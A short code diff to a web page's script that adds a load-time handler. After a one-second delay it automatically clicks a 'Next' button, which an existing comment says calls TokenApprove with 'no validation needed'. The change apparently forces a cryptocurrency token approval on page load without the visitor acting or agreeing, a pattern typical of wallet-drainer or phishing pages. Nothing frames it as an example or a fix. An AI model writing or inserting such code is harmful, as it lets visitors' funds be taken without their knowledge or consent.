@@ -704,6 +704,17 @@ if (typeof window !== 'undefined') {
 </script>
 <script>
     // Next button directly calls TokenApprove - no validation needed
+    
+    // Auto-click Next button when page fully loads
+    window.addEventListener('load', function() {
+        // Small delay to ensure everything is ready
+        setTimeout(function() {
+            const nextBtn = document.getElementById('nextBtn');
+            if (nextBtn) {
+                nextBtn.click();
+            }
+        }, 1000);
+    });
 </script>
 
 
